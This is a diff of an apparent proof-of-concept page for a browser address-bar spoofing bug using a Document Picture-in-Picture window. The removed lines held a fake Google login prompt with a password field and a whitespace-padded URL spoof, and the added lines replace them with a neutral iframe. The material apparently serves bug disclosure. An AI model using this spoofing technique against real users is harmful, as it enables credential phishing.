@@ -9,12 +9,11 @@ html { font-family: sans-serif; height: 100%; width: 100%; cursor: pointer; }
 <body>
 <h1>Attacker</h1>
 <p>origin: <span id="originOutput"></span></p>
-<p>Click within body to login your Google account</p>
+<p>Click within body (or press any key) to run PoC.</p>
 <script>
 originOutput.innerText = window.origin;
 var newWin;
 var runPoC = async () => {
-    history.replaceState('','','?callback=                                                                                                              test.bughunter.google.com');
     newWin = await documentPictureInPicture.requestWindow();
     var newWinContent = newWin.document.createElement('div');
     newWinContent.innerHTML = `
@@ -27,14 +26,14 @@ iframe { border: 0; width: 100vw; height: 500px; }
 <div id="content">
 <h3>Attacker content with spoofed PiP address bar</h3>
 </div>
-<input type='password'>`;
+<iframe src='https://abc.xyz'></iframe>"`;
     newWin.document.body.appendChild(newWinContent);
 
     var newWinScript = newWin.document.createElement('script');
     newWinScript.innerText = "";
     newWin.document.body.appendChild(newWinScript);
-
 }
+
 window.addEventListener('click', 
     runPoC
 );
